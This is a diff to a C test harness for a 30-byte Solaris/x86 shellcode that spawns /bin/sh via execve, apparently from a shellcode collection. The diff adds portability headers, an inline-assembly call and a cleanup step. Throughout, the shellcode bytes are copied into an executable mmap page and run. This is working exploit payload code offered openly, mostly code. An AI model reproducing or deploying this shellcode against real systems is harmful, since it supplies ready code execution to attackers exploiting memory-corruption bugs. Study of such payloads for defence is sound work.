@@ -1,11 +1,16 @@
 #include <stdio.h>
 #include <string.h>
+
+#if (defined __sun || defined __FreeBSD__)
+# include <strings.h>
+#endif
+
 #include <unistd.h>
 #include <sys/mman.h>
 #include <sys/utsname.h>
 
 /*
- * SunOS (Solaris) / x86 execvex() 30 bytes shellcode
+ * SunOS (Solaris) / x86 execve("/bin/sh", {"/bin/sh", NULL}, NULL) 30 bytes shellcode
  *
  * Paulus Gandung Prakosa <gandung@lists.infradead.org>
  *
@@ -32,13 +37,23 @@
  * 8050444:       cd 91                   int    $0x91
  */
 
-int main(void)
+#ifndef unused
+# define unused(x) ((void)(x))
+#endif
+
+int main(int argc, char **argv)
 {
+	unused(argc);
+	unused(argv);
+
+	struct utsname uts;
+	char *pcall;
 	char *shellcode = "\x33\xf6\x56\x68\x6e\x2f\x73\x68"
                           "\x68\x2f\x2f\x62\x69\x8b\xdc\x56"
                           "\x53\x8b\xcc\x56\x56\x51\x53\x33"
                           "\xc0\xb0\x3b\x50\xcd\x91";
-	void (*pcall)(void) = mmap(
+
+	pcall = mmap(
 		NULL,
 		sysconf(_SC_PAGESIZE),
 		PROT_WRITE| PROT_EXEC,
@@ -52,7 +67,7 @@ int main(void)
 		return -1;
 	}
 
-	struct utsname uts;
+	bzero(&uts, sizeof(struct utsname));
 
 	if (uname(&uts) < 0) {
 		perror("uname()");
@@ -71,7 +86,14 @@ int main(void)
 	memcpy(pcall, shellcode, strlen(shellcode));
 
 	printf("[*] Executing the shellcode..\n");
-	pcall();
+	__asm__ __volatile__(
+		"call *%%eax\r\n"
+		:
+		: "a"(pcall)
+	);
+
+	printf("[*] Cleaning up..\n");
+	munmap(pcall, sysconf(_SC_PAGESIZE));
 
 	return 0;
 }
